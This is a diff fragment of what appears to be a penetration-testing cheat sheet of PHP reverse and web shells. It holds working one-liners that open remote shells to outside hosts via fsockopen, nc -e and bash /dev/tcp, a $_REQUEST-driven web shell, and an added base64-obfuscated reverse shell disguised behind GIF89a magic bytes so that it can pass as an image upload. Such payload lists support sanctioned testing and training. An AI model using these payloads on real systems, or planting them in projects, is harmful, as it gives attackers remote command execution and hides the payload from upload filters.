@@ -219,10 +219,33 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 system('nc.exe -e cmd.exe 10.10.10.5 4444')
 
 ?>
+
+or
+
+
+<?php
+exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.45.204/4444 0>&1'");
+
+
 ```
 
 ```
 <?php system($_REQUEST["cmd"]); ?>
+```
+
+```php
+
+You could also encode this:
+
+    echo "sh -i >& /dev/tcp/192.168.1.75/8081 0>&1" | base64 -w 0
+
+
+Then do this with GIF Magic Bytes
+
+     GIF89a;
+    <?php
+      system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzgwODEgMD4mMQo= | base64 -d | bash");
+    ?>
 ```
 #### ASP/x
 
